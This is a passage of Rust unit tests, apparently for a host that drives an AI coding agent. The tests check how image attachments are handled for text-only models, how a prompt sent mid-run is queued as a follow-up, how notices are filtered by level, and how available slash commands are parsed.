        respond(&mut text_only, &req(&hello, "get_state"), json!({"model": {"provider": "p", "id": "m", "input": ["text"]}}));
        let sent = text_only.command(Command::Prompt { text: "look".into(), attachments: vec![Attachment::file(png.to_str().unwrap())] }, 1);
        assert!(sent.send[0].get("images").is_none());
        assert_eq!(sent.send[0]["message"], format!("look\n\nFiles:\n- {}", png.display()));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_prompt_while_omp_runs_by_itself_is_queued_there_and_notices_are_passed_on() {
        let mut o = open();
        line(&mut o, json!({"type": "agent_start"}), 1);
        assert_eq!(o.status(), HostStatus::Working);
        assert_eq!(prompt(&mut o, "now").send[0]["streamingBehavior"], "followUp");
        let mut o = open();
        assert_eq!(line(&mut o, json!({"type": "notice", "level": "warning", "message": "context is large"}), 1).events, [AgentEvent::Notice { text: "context is large".into() }]);
        assert!(line(&mut o, json!({"type": "notice", "level": "info", "message": "hello"}), 1).events.is_empty());
        let cmds = line(&mut o, json!({"type": "available_commands_update", "commands": [{"name": "compact", "source": "builtin", "description": "Compact", "input": {"hint": "[focus]"}}, {"name": "skill:x", "source": "skill"}]}), 1);
        assert_eq!(cmds.events, [AgentEvent::Commands { commands: vec![SlashCommand { name: "compact".into(), description: "Compact".into(), hint: Some("[focus]".into()) }, SlashCommand { name: "skill:x".into(), description: String::new(), hint: None }] }]);
    }
}
